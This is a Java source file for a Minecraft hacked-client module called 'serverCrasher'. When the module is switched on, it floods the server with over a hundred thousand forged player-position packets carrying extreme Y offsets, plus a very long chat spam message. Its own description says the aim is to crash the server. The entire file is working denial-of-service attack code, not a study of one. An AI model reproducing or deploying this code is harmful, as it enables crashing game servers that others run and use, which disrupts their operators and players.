package com.darkcart.xdolf.mods.player;

import org.lwjgl.input.Keyboard;

import com.darkcart.xdolf.Module;
import com.darkcart.xdolf.util.Category;

import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.CPacketPlayer;

public class serverCrasher extends Module {

	public serverCrasher() {
		super("serverCrasher", "Vanilla", "Sends packets to the server, which will try to crash it. Might be patched..",
				Keyboard.KEYBOARD_SIZE, 0xFFFFFF, Category.PLAYER);
	}

	@Override
	public void onEnable() {
		for (int i = 0; i < 1337; i++) {
			Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4.0E7D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.player.posX, Minecraft.player.posY - 4000.0D, Minecraft.player.posZ, true));
		    Minecraft.player.sendChatMessage("lOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOL" + Math.random() * 2.0E7D * Math.random() + 3.141592653589793D + 3.141592653589793D + 3.141592653589793D + 3.141592653589793D + 3.141592653589793D + 3.141592653589793D + 3.141592653589793D + 3.141592653589793D + 3.141592653589793D + 3.141592653589793D + 3.141592653589793D + 3.141592653589793D + 3.141592653589793D + 3.141592653589793D);
		  }
	}

}
